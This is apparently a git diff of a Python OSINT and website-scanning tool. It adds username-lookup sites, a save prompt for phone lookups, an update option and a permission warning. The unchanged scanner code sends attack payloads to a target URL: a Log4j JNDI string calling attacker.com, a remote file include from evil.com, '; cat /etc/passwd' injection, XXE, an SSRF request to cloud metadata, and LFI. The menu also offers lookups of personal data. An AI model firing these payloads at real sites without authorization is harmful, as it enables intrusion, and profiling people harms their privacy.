@@ -56,7 +56,7 @@ print("""\033[1;34m
 ⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠈⠀⠃⠀⠀⠘⠀⠀⡇⡜⠈⡸⢸⠀⢹⢸⠈⢆⠁⠀⢱⠁⠀⢇⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠘⠀⠘⠀⠀⢸⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            
-                    \033[1;32mv3.3.3\033[1;37m
+                    \033[1;32mv4.3.4\033[1;37m
 
 THIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.
 PERSONAL WEBSITE : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html""")
@@ -69,12 +69,13 @@ def main_menu():
 [\033[1;34m04\033[1;37m] - Domains OSINT          [\033[1;34m14\033[1;37m] - Israeli Databases \U0001F923
 [\033[1;34m05\033[1;37m] - IP's OSINT             [\033[1;34m15\033[1;37m] - Verify Passwords Leakage
 [\033[1;34m06\033[1;37m] - Networks OSINT         [\033[1;34m16\033[1;37m] - Scan Websites For Bugs
-[\033[1;34m07\033[1;37m] - Images OSINT           [\033[1;34m17\033[1;37m] - Get MacAddress
+[\033[1;34m07\033[1;37m] - MetaData               [\033[1;34m17\033[1;37m] - Get MacAddress
 [\033[1;34m08\033[1;37m] - PhoneNumbers OSINT
 [\033[1;34m09\033[1;37m] - Search Engine
 [\033[1;34m10\033[1;37m] - Ports Scan
 
-[\033[1;34m98\033[1;37m] - Report Bug
+[\033[1;34m97\033[1;37m] - Update
+[\033[1;34m98\033[1;37m] - Report A Bug
 [\033[1;34m99\033[1;37m] - Help
 [\033[1;34m00\033[1;37m] - Exit""")
 
@@ -306,9 +307,11 @@ def handle_selection(selection):
                 "Wikipedia": f"https://www.wikipedia.org/wiki/User:{username}/",
                 "Udemy": f"https://www.udemy.com/user/{username}/",
                 "Canva": f"https://www.canva.com/{username}/",
+                "Payhip": f"https://payhip.com/{username}",
                 "Portswigger": f"https://portswigger.net/users//{username}",
                 "DokanTip": f"https://tip.dokan.sa/{username}/",
-                "Harmash": f"https://harmash.com/users/{username}/" }
+                "Harmash": f"https://harmash.com/users/{username}/",
+                "EXPO - ReactNative": f"https://expo.dev/accounts/{username}" }
 
             found_sites = []
             for site, url in websites.items():
@@ -1156,13 +1159,27 @@ Choose : \033[1;34m""")
                             name = numbers['name']
                             country_code = numbers['country_code']
                             address = numbers['address']
+
+                            print(f"\033[1;37m[\033[1;34m-\033[1;37m] Name : \033[1;34m{name}")
+                            time.sleep(0.1)
+                            print(f"\033[1;37m[\033[1;34m-\033[1;37m] Number : \033[1;34m{number}")
+                            time.sleep(0.1)
+                            print(f"\033[1;37m[\033[1;34m-\033[1;37m] CountryCode : \033[1;34m{country_code}")
+                            time.sleep(0.1)
+                            print(f"\033[1;37m[\033[1;34m-\033[1;37m] Address : \033[1;34m{address}\n")
+                            time.sleep(0.1)
+
+                        results_save = input("\033[1;37mDo u want to save the results? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
+                        if results_save == "Y" or results_save == "y" or results_save == "Yes" or results_save== "yes" or results_save == "YES": 
                             with open("SRFTOOTN.txt", "at", encoding="utf-8") as f: 
                                 f.write(f"""[-] Name : {name}
 [-] Number : {number}
 [-] CountryCode : {country_code}
 [-] Address : {address}\n\n""")
-
-                        print(f"\033[1;37m[\033[1;32m✓\033[1;37m] The results has been saved in \033[1;34m{ os.getcwd()}\SRFTOOTN.txt\033[1;37m")
+                                
+                            print(f"\033[1;37m[\033[1;32m✓\033[1;37m] The results has been saved in \033[1;34m{ os.getcwd()}\SRFTOOTN.txt\033[1;37m")
+                        elif results_save == "N" or results_save == "n" or results_save == "No" or results_save== "no" or results_save == "NO": pass
+                        else: print("\033[1;31mPlease choose a valid option!\033[1;37m")
                 elif 'No recourd found' in r.text: print("\033[1;31mnothing found for this name!")
             else: print("\033[1;31myour Country not in the list!")
 
@@ -1547,7 +1564,8 @@ Choose : \033[1;34m""")
             exit()
 
     elif selection == "16" or selection == "Scan Websites For Bugs" or selection == "SCAN WEBSITES FOR BUGS" or selection == "scan websites for bugs":
-        url = input("\033[1;37m[\033[1;34m+\033[1;37m] Enter the target website URL (ex: https://example.com) : \033[1;34m")
+        print("\033[1;31mWarning : To avoid legal problems, seek permission from the website owner before scan.")
+        url = input("\n\033[1;37m[\033[1;34m+\033[1;37m] Enter the target website URL (ex: https://example.com) : \033[1;34m")
 
         results = []
 
@@ -1582,9 +1600,9 @@ Choose : \033[1;34m""")
             for payload in xss_payloads:
                 response = requests.get(url, params={'q': payload})
                 if payload in response.text:
-                    add_result("XSS", "\033[1;31mBug\033[1;31m", f"\033[1;31mPayload : {payload}\033[1;37m", "High")
+                    add_result("XSS/Cross Site Scripting", "\033[1;31mBug\033[1;31m", f"\033[1;31mPayload : {payload}\033[1;37m", "High")
                     Bug = True
-            if not Bug: add_result("XSS", "\033[1;32mNo bug\033[1;37m", "\033[1;32mNo payloads were executed\033[1;37m", "Low")
+            if not Bug: add_result("XSS/Cross Site Scripting", "\033[1;32mNo bug\033[1;37m", "\033[1;32mNo payloads were executed\033[1;37m", "Low")
 
         def sql_injection(url):
             sql_payloads = [
@@ -1609,8 +1627,8 @@ Choose : \033[1;34m""")
 
         def idor(url):
             response = requests.get(f"{url}/user/1")
-            if response.status_code == 200: add_result("IDOR", "\033[1;31mBug\033[1;37m", "Able to access user data", "High")
-            else: add_result("IDOR", "\033[1;32mNo bug\033[1;37m", "\033[1;32mIDOR bug not found\033[1;37m", "Low")
+            if response.status_code == 200: add_result("IDOR (Insecure Direct Object Reference)", "\033[1;31mBug\033[1;37m", "Able to access user data", "High")
+            else: add_result("IDOR (Insecure Direct Object Reference)", "\033[1;32mNo bug\033[1;37m", "\033[1;32mIDOR bug not found\033[1;37m", "Low")
 
         def path_traversal(url):
             traversal_payloads = [
@@ -1628,8 +1646,8 @@ Choose : \033[1;34m""")
             ssrf_payload = 'http://169.254.169.254/latest/meta-data/'
             try: 
                 response = requests.get(url, params={'url': ssrf_payload})
-                if "instance-id" in response.text:  add_result("SSRF", "\033[1;31mBug\033[1;37m", f"\033[1;31mPayload: {ssrf_payload}\033[1;37m", "High")
-                else: add_result("SSRF", "\033[1;32mNo bug\033[1;37m", "\033[1;32mSSRF bug not found\033[1;37m", "Low")
+                if "instance-id" in response.text:  add_result("SSRF (Server-Side Request Forgery)", "\033[1;31mBug\033[1;37m", f"\033[1;31mPayload: {ssrf_payload}\033[1;37m", "High")
+                else: add_result("SSRF (Server-Side Request Forgery)", "\033[1;32mNo bug\033[1;37m", "\033[1;32mSSRF bug not found\033[1;37m", "Low")
             except requests.exceptions.RequestException: add_result("SSRF", "Error", "Request failed", "High")
 
         def xxe(url):
@@ -1639,14 +1657,14 @@ Choose : \033[1;34m""")
             <foo>&xxe;</foo>"""
             headers = {'Content-Type': 'application/xml'}
             response = requests.post(url, data=xml_payload, headers=headers)
-            if "root:x:0:0:" in response.text: add_result("XXE", "\033[1;31mBug\033[1;37m", "\033[1;31mAble to read system files\033[1;37m", "High")
-            else: add_result("XXE", "\033[1;32mNo bug\033[1;37m", "\033[1;32mXXE bug not found\033[1;37m", "Low")
+            if "root:x:0:0:" in response.text: add_result("XXE (XML External Entity)", "\033[1;31mBug\033[1;37m", "\033[1;31mAble to read system files\033[1;37m", "High")
+            else: add_result("XXE (XML External Entity)", "\033[1;32mNo bug\033[1;37m", "\033[1;32mXXE bug not found\033[1;37m", "Low")
 
         def rce(url):
             rce_payload = "; cat /etc/passwd"
             response = requests.get(f"{url}/?cmd={rce_payload}")
-            if "root:x:0:0:" in response.text: add_result("RCE", "\033[1;31mBug\033[1;37m", "\033[1;31mAble to execute arbitrary commands\033[1;37m", "High")
-            else: add_result("RCE", "\033[1;32mNo bug\033[1;37m", "\033[1;32mRCE bug not found\033[1;37m", "Low")
+            if "root:x:0:0:" in response.text: add_result("RCE (Remote Code Execution)/PHP Code Injection", "\033[1;31mBug\033[1;37m", "\033[1;31mAble to execute arbitrary commands\033[1;37m", "High")
+            else: add_result("RCE (Remote Code Execution)/PHP Code Injection", "\033[1;32mNo bug\033[1;37m", "\033[1;32mRCE bug not found\033[1;37m", "Low")
 
         def log4j(url):
             log4j_payload = "${jndi:ldap://attacker.com/a}"
@@ -1658,14 +1676,14 @@ Choose : \033[1;34m""")
         def lfi(url):
             lfi_payload = "/etc/passwd"
             response = requests.get(f"{url}?file={lfi_payload}")
-            if "root:x:0:0:" in response.text: add_result("LFI", "\033[1;31mBug\033[1;37m", "LFI bug not found", "High")
-            else: add_result("LFI", "\033[1;32mNo bug\033[1;37m", "\033[1;32mLFI bug not found\033[1;37m", "Low")
+            if "root:x:0:0:" in response.text: add_result("LFI (Local File Include)", "\033[1;31mBug\033[1;37m", "LFI bug not found", "High")
+            else: add_result("LFI (Local File Include)", "\033[1;32mNo bug\033[1;37m", "\033[1;32mLFI bug not found\033[1;37m", "Low")
 
         def rfi(url):
             rfi_payload = "http://evil.com/malicious.php"
             response = requests.get(f"{url}?file={rfi_payload}")
-            if "malicious content" in response.text: add_result("RFI", "\033[1;31mBug\033[1;37m", "RFI bug not found", "High")
-            else: add_result("RFI", "\033[1;32mNo bug\033[1;37m", "\033[1;32mRFI bug not found\033[1;37m", "Low")
+            if "malicious content" in response.text: add_result("RFI (Remote File Include)", "\033[1;31mBug\033[1;37m", "RFI bug not found", "High")
+            else: add_result("RFI (Remote File Include)", "\033[1;32mNo bug\033[1;37m", "\033[1;32mRFI bug not found\033[1;37m", "Low")
 
         def info_disclosure(url):
             response = requests.get(url)
@@ -1691,7 +1709,7 @@ Choose : \033[1;34m""")
             unauthorized_user_id = "67890"
             response = requests.get(f"{url}/objects/{test_object_id}")
             if unauthorized_user_id in response.text: add_result("BOLA", "\033[1;31mBug\033[1;37m", f"\033[1;31mObject accessed with ID : {unauthorized_user_id}\033[1;37m", "High")
-            else: add_result("BOLA", "\033[1;32mNo bug\033[1;37m", "\033[1;32mBOLA bug found\033[1;37m", "Low")
+            else: add_result("BOLA", "\033[1;32mNo bug\033[1;37m", "\033[1;32mBOLA bug not found\033[1;37m", "Low")
 
         def sensitive_info(url):
             response = requests.get(url)
@@ -1736,7 +1754,35 @@ Choose : \033[1;34m""")
             print("\033[1;31mPlease choose a valid option!\033[1;37m")
             exit()
 
-    elif selection == "98" or selection == "Report bug" or selection == "REPORT BUG" or selection == "rebort bug":
+    elif selection == "97" or selection == "Update" or selection == "UPDATE":
+        print("\n\033[1;37mUpdating...\n")
+        
+        time.sleep(0.1)
+
+        def loading_bar(progress, total):
+            bar_length = 65
+            percent = 100*(progress/float(total))
+            filled_length = int(bar_length*progress//total)
+            bar = "█"*filled_length+"-"*(bar_length-filled_length)
+            sys.stdout.write(f"\r[\033[1;32m{bar}\033[1;37m] {percent:.2f}%")
+            sys.stdout.flush()
+        steps = 35
+        for i in range(steps):
+            time.sleep(0.1)
+            loading_bar(i+1, steps)
+
+        subprocess.run(["git", "clone", "https://github.com/tlersa/TS-OSINT.git"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print(f"""\n\033[1;37m[\033[1;32m✓\033[1;37m] Updated successfully
+new version saved in \033[1;34m{ os.getcwd()}\TS-OSINT\033[1;37m""")
+
+        another_operation = input("\n\033[1;37mWould u like another operation? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
+        if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
+        elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
+        else:
+            print("\033[1;31mPlease choose a valid option!\033[1;37m")
+            exit()
+
+    elif selection == "98" or selection == "Report A Bug" or selection == "REPORT A BUG" or selection == "rebort a bug":
         print("""\n\033[1;37mContact me through one of my acc
 all my acc : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html#contact""")
 
